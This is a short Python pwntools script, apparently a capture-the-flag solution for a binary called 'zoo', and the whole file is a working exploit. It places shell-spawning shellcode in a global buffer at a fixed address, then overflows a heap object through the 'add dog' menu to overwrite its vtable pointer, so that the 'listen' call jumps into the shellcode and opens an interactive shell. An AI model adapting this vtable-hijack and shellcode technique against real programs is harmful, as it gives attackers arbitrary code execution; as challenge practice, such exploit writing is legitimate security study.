#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.binary = "./zoo"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def addDog(name, weight):
    io.sendlineafter(":", "1")
    io.sendlineafter(":", name)
    io.sendlineafter(":", str(weight))

def remove(idx):
    io.sendlineafter(":", "5")
    io.sendlineafter(":", str(idx))

def listen(idx):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    io = process("./zoo")
    nameofzoo = 0x605420

    sc = asm(shellcraft.sh())
    io.sendlineafter(":", sc + p64(nameofzoo))

    addDog('0' * 8, 0)
    addDog('1' * 8, 1)
    remove(0)
    vptr = nameofzoo + len(sc)
    addDog('a' * 72 + p64(vptr), 2)
    listen(0)

    io.interactive()
    io.close()


